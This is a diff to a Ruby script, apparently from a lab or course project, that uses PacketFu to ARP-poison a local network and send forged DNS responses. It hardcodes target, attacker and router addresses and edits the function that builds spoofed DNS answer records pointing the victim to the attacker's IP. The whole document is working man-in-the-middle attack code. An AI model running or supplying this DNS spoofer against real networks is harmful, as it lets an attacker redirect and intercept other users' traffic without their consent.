@@ -8,12 +8,13 @@ require 'thread'
 
 
 ## User defined variables
-@target_ip   = "192.168.1.66"  # IP of the host you would like to target
-@target_mac  = "bc:f5:ac:e2:c6:28"
-@sender_ip   = "192.168.1.79"  # Your IP, or the attacking IP (MITM)
+@target_ip   = "192.168.1.100"  # IP of the host you would like to target
+#@target_mac  = "bc:f5:ac:e2:c6:28" #android
+@target_mac  = "b8:ac:6f:34:ad:d8"
+@sender_ip   = "192.168.1.101"  # Your IP, or the attacking IP (MITM)
 @sender_mac  = "7c:7a:91:7d:2b:02"
-@router_ip   = "192.168.1.254"    # IP of the router on the network to ARP Poison
-@router_mac  = "ec:43:f6:49:a3:96"
+@router_ip   = "192.168.1.1"    # IP of the router on the network to ARP Poison
+@router_mac  = "00:22:6b:7c:9b:12"
 @iface       = "wlp2s0"         # Name of the primary network interface 
 
 ## DO NOT EDIT BELOW THIS LINE
@@ -88,12 +89,13 @@ end
 def send_dns_response(orig_pkt, name)
 
   #UDP/IP headers
-  dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
+  #dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
+  dns_resp = PacketFu::UDPPacket.new
   dns_resp.eth_saddr = @sender_mac
   dns_resp.eth_daddr = @target_mac
-  dns_resp.udp_dst   = orig_pkt.udp_src
-  dns_resp.udp_src   = orig_pkt.udp_dst
-  dns_resp.ip_saddr  = orig_pkt.ip_daddr
+  dns_resp.udp_dst   = orig_pkt.udp_src.to_i
+  dns_resp.udp_src   = "53"
+  dns_resp.ip_saddr  = orig_pkt.ip_saddr
   dns_resp.ip_daddr  = @target_ip
 
   #DNS header
@@ -104,8 +106,9 @@ def send_dns_response(orig_pkt, name)
   tmp_payload = transID
 
   #tmp_payload = orig_pkt.payload[0,2].unpack
-  tmp_payload += "\x85\x80".force_encoding('ASCII-8BIT') + "\x00\x01\x00\x02".force_encoding('ASCII-8BIT') 
-  tmp_payload += "\x04\x00\x00\x04".force_encoding('ASCII-8BIT') #may need to edit this
+  tmp_payload += "\x81\x80".force_encoding('ASCII-8BIT')          # resp code
+  tmp_payload += "\x00\x01\x00\x01".force_encoding('ASCII-8BIT')  # question amt & answer RR
+  tmp_payload += "\x00\x00\x00\x00".force_encoding('ASCII-8BIT')  # auth and additional RR
 
   #Domain Name
   name.split('.').each do |part|
@@ -114,11 +117,14 @@ def send_dns_response(orig_pkt, name)
   end
 
   #Rest of DNS Header (defaults from notes)
-  tmp_payload += "\x00\x00\x01".force_encoding('ASCII-8BIT') + "\x00\x01".force_encoding('ASCII-8BIT') 
-  tmp_payload += "\xc0\x0c\x00\x05".force_encoding('ASCII-8BIT')
-  tmp_payload += "\x00\x01\x00\x02\xa3\x00\x04".force_encoding('ASCII-8BIT') #may need to edit this
+  tmp_payload += "\x00\x00\x01".force_encoding('ASCII-8BIT') + "\x00\x01".force_encoding('ASCII-8BIT') #type and class
 
-
+  # DNS ANSWER
+  tmp_payload += "\xc0\x0c".force_encoding('ASCII-8BIT')          #name
+  tmp_payload += "\x00\x01".force_encoding('ASCII-8BIT')          #type
+  tmp_payload += "\x00\x01".force_encoding('ASCII-8BIT')          #class
+  tmp_payload += "\x00\x00\x00\x15".force_encoding('ASCII-8BIT')  #TTL
+  tmp_payload += "\x00\x04".force_encoding('ASCII-8BIT')          #data len
   #Spoofed IP
   ip_ary = @sender_ip.split('.')
   tmp_payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')
